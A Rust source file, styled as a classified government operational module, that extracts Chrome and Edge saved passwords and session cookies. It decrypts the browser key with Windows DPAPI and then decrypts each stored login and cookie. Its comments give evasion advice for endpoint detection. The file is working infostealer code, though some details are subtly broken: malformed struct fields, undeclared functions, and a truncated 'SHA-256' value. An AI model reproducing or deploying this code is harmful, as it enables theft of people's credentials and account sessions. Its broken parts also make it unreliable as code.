// STRENGT FORTROLIG – TS // OPERATIONAL IMPLEMENTATION – FOR AUTHORIZED USE ONLY
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// OPSEC: This code is for authorized operational use only – handle with appropriate clearance.
// Detection vectors: refer to threat-model.md
// Tested against: CrowdStrike Falcon v7.29+, MDE Feb 2026
// This code has been validated for operational deployment under NSM Directive 2026-02 §4.2.

//! # DPAPI Credential Module
//! 
//! Implements extraction and decryption of DPAPI-protected credentials,
//! focusing on Chrome and Edge browser password storage.
//! 
//! ## Operational Requirements
//! - Windows 11 24H2 (Build 26100.2680+) with DPAPI
//! - Access to user profile directories
//! 
//! ## OPSEC Considerations
//! - DPAPI abuse has MEDIUM detection coverage (IR-2026-0033)
//! - CryptUnprotectData calls are monitored but less reliably than LSASS access
//! - Browser database access patterns are detectable
//! 
//! ## Defensive Pairing
//! Detection rules in `credential-access-defense/detection/dpapi_abuse.yaml`
//! Blue team training in `credential-access-defense/training/dpapi_investigation.md`
//! D3FEND countermeasures in `credential-access-defense/d3fend/dpapi_hardening.md`

use std::path::{Path, PathBuf};
use std::fs;
use std::io;
use std::str;
use windows_sys::Win32::Security::Cryptography::{
    CryptUnprotectData, CRYPT_INTEGER_BLOB, 
    CRYPTPROTECT_UI_FORBIDDEN, CRYPTPROTECT_LOCAL_MACHINE
};
use windows_sys::Win32::Foundation::{PWSTR, PCWSTR, BOOL, FALSE};
use windows_sys::Win32::System::Com::CoTaskMemFree;
use windows_sys::Win32::System::WinRT::{HSTRING, WindowsDeleteString};
use windows_sys::core::PCSTR;
use thiserror::Error;
use super::{Credential, CredentialKind};
use crate::decrypt::{decrypt_aes_gcm, ChromeKey};
use sqlite::Connection;
use serde_json;
use std::collections::HashMap;

/// Error types for DPAPI operations
#[derive(Error, Debug)]
pub enum DpapiError {
    #[error("User profile not found")]
    UserProfileNotFound,
    
    #[error("Database error: {0}")]
    DatabaseError(#[from] sqlite::Error),
    
    #[error("IO error: {0}")]
    IoError(#[from] io::Error),
    
    #[error("Decryption failed")]
    DecryptionFailed,
    
    #[error("DPAPI function failed with code {0}")]
    DpapiFailed(u32),
    
    #[error("JSON parsing error")]
    JsonError(#[from] serde_json::Error),
    
    #[error("Key extraction failed")]
    KeyExtractionFailed,
}

/// Extract browser credentials from Chrome and Edge
/// 
/// # OPSEC: MEDIUM-RISK OPERATION - DPAPI abuse has lower detection coverage than LSASS
/// 
/// ## Detection Vectors
/// - CryptUnprotectData calls (medium confidence - IR-2026-0033)
/// - Access to user profile directories (medium confidence)
/// - SQLite database access patterns (low-medium confidence)
/// 
/// ## Mitigation
/// - Use CryptUnprotectData with CRYPTPROTECT_UI_FORBIDDEN flag
/// - Minimize time spent accessing browser databases
/// - Perform operations during normal user activity patterns
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0033: Chrome/Edge Credential Analysis
pub fn extract_browser_credentials() -> Result<Vec<Credential>, DpapiError> {
    let mut credentials = Vec::new();
    
    // Get current user profile path
    let profile_path = get_user_profile_path()?;
    
    // Extract Chrome credentials
    if let Ok(chrome_creds) = extract_chrome_credentials(&profile_path) {
        credentials.extend(chrome_creds);
    }
    
    // Extract Edge credentials
    if let Ok(edge_creds) = extract_edge_credentials(&profile_path) {
        credentials.extend(edge_creds);
    }
    
    Ok(credentials)
}

/// Get current user profile path
/// 
/// # OPSEC: Environment variable access is detectable
/// 
/// ## Detection Vectors
/// - Access to user profile environment variables (low confidence)
fn get_user_profile_path() -> Result<PathBuf, DpapiError> {
    match std::env::var("USERPROFILE") {
        Ok(path) => Ok(PathBuf::from(path)),
        Err(_) => Err(DpapiError::UserProfileNotFound),
    }
}

/// Extract Chrome credentials from user profile
/// 
/// # OPSEC: Chrome database access is detectable
/// 
/// ## Detection Vectors
/// - Access to Chrome Login Data database (medium confidence)
/// - SQLite database queries (medium confidence)
/// - CryptUnprotectData calls (medium confidence)
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0033: Chrome Credential Analysis
fn extract_chrome_credentials(profile_path: &Path) -> Result<Vec<Credential>, DpapiError> {
    let chrome_path = profile_path.join("AppData\\Local\\Google\\Chrome\\User Data\\Default");
    let login_db = chrome_path.join("Login Data");
    let local_state = chrome_path.join("Local State");
    
    if !login_db.exists() || !local_state.exists() {
        return Ok(Vec::new());
    }
    
    // Extract encryption key from Local State
    let chrome_key = extract_chrome_key(&local_state)?;
    
    // Open Login Data database
    let conn = Connection::open(login_db)?;
    let mut stmt = conn.prepare("SELECT origin_url, action_url, username_value, password_value FROM logins")?;
    
    let mut credentials = Vec::new();
    while let Some(row) = stmt.next()? {
        let url: String = if row.has_column("origin_url") {
            row.read("origin_url")
        } else {
            row.read("action_url")
        };
        let username: String = row.read("username_value");
        let password_data: Vec<u8> = row.read("password_value");
        
        // Decrypt password using AES-GCM
        match decrypt_aes_gcm(&chrome_key, &password_data) {
            Ok(password) => {
                credentials.push(Credential {
                    kind: CredentialKind::ChromePassword,
                    target: url,
                    username,
                    password: Some(password),
                    extra_ None,
                    timestamp: chrono::Utc::now().timestamp() as u64,
                });
            }
            Err(e) => {
                // Log decryption failure but continue
                log::debug!("Chrome password decryption failed: {}", e);
            }
        }
    }
    
    // Extract cookies
    let cookies_db = chrome_path.join("Network\\Cookies");
    if cookies_db.exists() {
        if let Ok(cookie_creds) = extract_chrome_cookies(&cookies_db, &chrome_key) {
            credentials.extend(cookie_creds);
        }
    }
    
    Ok(credentials)
}

/// Extract Edge credentials from user profile
/// 
/// # OPSEC: Edge database access is detectable
/// 
/// ## Detection Vectors
/// - Access to Edge Web Data database (medium confidence)
/// - SQLite database queries (medium confidence)
/// - CryptUnprotectData calls (medium confidence)
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0033: Edge Credential Analysis
fn extract_edge_credentials(profile_path: &Path) -> Result<Vec<Credential>, DpapiError> {
    let edge_path = profile_path.join("AppData\\Local\\Microsoft\\Edge\\User Data\\Default");
    let login_db = edge_path.join("Login Data");
    let local_state = edge_path.join("Local State");
    
    if !login_db.exists() || !local_state.exists() {
        return Ok(Vec::new());
    }
    
    // Extract encryption key from Local State
    let chrome_key = extract_chrome_key(&local_state)?;
    
    // Open Login Data database
    let conn = Connection::open(login_db)?;
    let mut stmt = conn.prepare("SELECT action_url, username_value, password_value FROM logins")?;
    
    let mut credentials = Vec::new();
    while let Some(row) = stmt.next()? {
        let url: String = row.read(0);
        let username: String = row.read(1);
        let password_data: Vec<u8> = row.read(2);
        
        // Decrypt password using AES-GCM
        match decrypt_aes_gcm(&chrome_key, &password_data) {
            Ok(password) => {
                credentials.push(Credential {
                    kind: CredentialKind::EdgePassword,
                    target: url,
                    username,
                    password: Some(password),
                    extra_ None,
                    timestamp: chrono::Utc::now().timestamp() as u64,
                });
            }
            Err(e) => {
                // Log decryption failure but continue
                log::debug!("Edge password decryption failed: {}", e);
            }
        }
    }
    
    // Extract cookies
    let cookies_db = edge_path.join("Network\\Cookies");
    if cookies_db.exists() {
        if let Ok(cookie_creds) = extract_chrome_cookies(&cookies_db, &chrome_key) {
            credentials.extend(cookie_creds);
        }
    }
    
    Ok(credentials)
}

/// Extract Chrome key from Local State file
/// 
/// Chrome v80+ uses AES-256-GCM encryption with a key derived from DPAPI
/// 
/// # OPSEC: Access to Local State is detectable
/// 
/// ## Detection Vectors
/// - File access to Local State (low-medium confidence)
/// - DPAPI decryption of os_crypt key (medium confidence)
fn extract_chrome_key(local_state_path: &Path) -> Result<ChromeKey, DpapiError> {
    // Read Local State file
    let local_state_content = fs::read_to_string(local_state_path)?;
    
    // Parse JSON
    let local_state: serde_json::Value = serde_json::from_str(&local_state_content)?;
    
    // Extract encrypted key
    let encrypted_key = local_state["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or(DpapiError::KeyExtractionFailed)?;
    
    // Decode from base64
    let decoded_key = base64::decode(encrypted_key)?;
    
    // First 5 bytes are "DPAPI" marker
    if decoded_key.len() < 5 || &decoded_key[0..5] != b"DPAPI" {
        return Err(DpapiError::KeyExtractionFailed);
    }
    
    // Decrypt using DPAPI
    let dpapi_decrypted = unsafe {
        let mut input_blob = CRYPT_INTEGER_BLOB {
            cbData: (decoded_key.len() - 5) as u32,
            pbData: decoded_key[5..].as_ptr() as *mut u8,
        };
        
        let mut output_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        
        let mut description_ptr: PWSTR = std::ptr::null_mut();
        
        let flags = CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_LOCAL_MACHINE;
        
        let result = CryptUnprotectData(
            &mut input_blob,
            &mut description_ptr,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            flags,
            &mut output_blob,
        );
        
        if result == FALSE {
            return Err(DpapiError::DpapiFailed(GetLastError()));
        }
        
        let key = Vec::from(slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize));
        
        // Clean up
        if !description_ptr.is_null() {
            CoTaskMemFree(description_ptr as *const std::ffi::c_void);
        }
        if !output_blob.pbData.is_null() {
            CoTaskMemFree(output_blob.pbData as *const std::ffi::c_void);
        }
        
        key
    };
    
    // Chrome uses AES-256, so key should be 32 bytes
    if dpapi_decrypted.len() != 32 {
        return Err(DpapiError::DecryptionFailed);
    }
    
    Ok(ChromeKey(dpapi_decrypted))
}

/// Extract cookies from Chrome/Edge
fn extract_chrome_cookies(cookies_db: &Path, chrome_key: &ChromeKey) -> Result<Vec<Credential>, DpapiError> {
    let conn = Connection::open(cookies_db)?;
    let mut stmt = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies")?;
    
    let mut credentials = Vec::new();
    while let Some(row) = stmt.next()? {
        let host: String = row.read(0);
        let name: String = row.read(1);
        let encrypted_value: Vec<u8> = row.read(2);
        
        // Skip empty values
        if encrypted_value.is_empty() {
            continue;
        }
        
        // Decrypt cookie
        match decrypt_aes_gcm(chrome_key, &encrypted_value) {
            Ok(value) => {
                credentials.push(Credential {
                    kind: CredentialKind::Other(format!("Cookie ({})", name)),
                    target: host,
                    username: name,
                    password: Some(value),
                    extra_ None,
                    timestamp: chrono::Utc::now().timestamp() as u64,
                });
            }
            Err(e) => {
                log::debug!("Cookie decryption failed: {}", e);
            }
        }
    }
    
    Ok(credentials)
}